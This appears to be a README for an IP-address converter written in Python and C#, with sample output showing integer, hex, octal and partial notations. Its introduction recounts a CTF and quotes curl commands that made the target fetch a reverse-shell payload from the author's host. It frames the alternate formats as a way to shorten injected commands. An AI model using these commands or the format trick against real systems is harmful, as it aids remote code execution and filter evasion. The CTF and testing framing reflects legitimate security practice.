# IPConverter
Convert an IP to additional formats


One of the CTFs I did a very long time ago required the target machine to reach out and grab a reverse shell.  My IP address was something similar to 192.168.109.204 and the code I provided to the vulnerable application was something similar to the following:

`curl http://192.168.109.204/ReverseShell.php`.


After numerous errors, and seeing other people in the competition getting callbacks from similar curl statements (they had shorter IP addresses like 192.168.1.5), I determined that my string was too long.  `curl http://192.168.109.204/a` also didn't work, nor did `curl 192.168.109.204/a`.
However, `curl 3232263628/a` did work, I got my reverse shell, and I was able to complete the CTF.



This is a simple IPConverter, in both Python and C# format, to convert your IP address into several different formats for testing.  Some applications will not accept these different formats, so verify before use.

## Example Usage

`python3 IPConverter.py 192.168.42.42`

```
original_input       => 192.168.42.42
32_bit_integer       => 3232246314
dotted_decimal       => 192.168.42.42
decimal             => 3232246314
hex                 => 0xc0a82a2a
octal               => 0o14052112452
partial_1           => 3232246314
partial_2           => 192.11020842
partial_3           => 192.168.10794
partial_4           => 192.168.42.42
```



`IPConverter.exe 192.168.42.42`

```
original_input       => 192.168.42.42
32_bit_integer       => 3232246314
dotted_decimal       => 192.168.42.42
decimal             => 3232246314
hex                 => 0xc0a82a2a
octal               => 0o14052112452
partial_1           => 3232246314
partial_2           => 192.11020842
partial_3           => 192.168.10794
partial_4           => 192.168.42.42
```
